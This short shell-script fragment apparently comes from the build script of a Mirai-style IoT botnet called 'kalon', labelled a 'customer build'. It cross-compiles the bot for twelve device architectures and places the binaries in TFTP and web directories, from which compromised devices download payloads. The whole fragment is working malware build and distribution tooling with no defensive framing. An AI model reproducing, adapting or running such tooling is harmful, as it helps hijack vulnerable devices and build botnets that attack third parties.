...
echo "<center>kalon! version: customer build<center>" > /var/www/html/index.html

compile_bot i586 kalon.x86 "-static"
compile_bot i686 kalon.i686 "-static"
compile_bot mips kalon.mips "-static"
compile_bot mipsel kalon.mpsl "-static"
compile_bot armv4l kalon.arm "-static"
compile_bot armv5l kalon.arm5 ""
compile_bot armv6l kalon.arm6 "-static"
compile_bot_arm7 armv7l kalon.arm7 "-static"
compile_bot powerpc kalon.ppc "-static"
compile_bot sparc kalon.spc "-static"
compile_bot m68k kalon.m68k "-static"
compile_bot sh4 kalon.sh4 "-static"

cp release/kalon.* /var/lib/tftpboot
mv release/kalon.* /var/www/html/bins

compile_bot i586 debug "-static -DDEBUG"
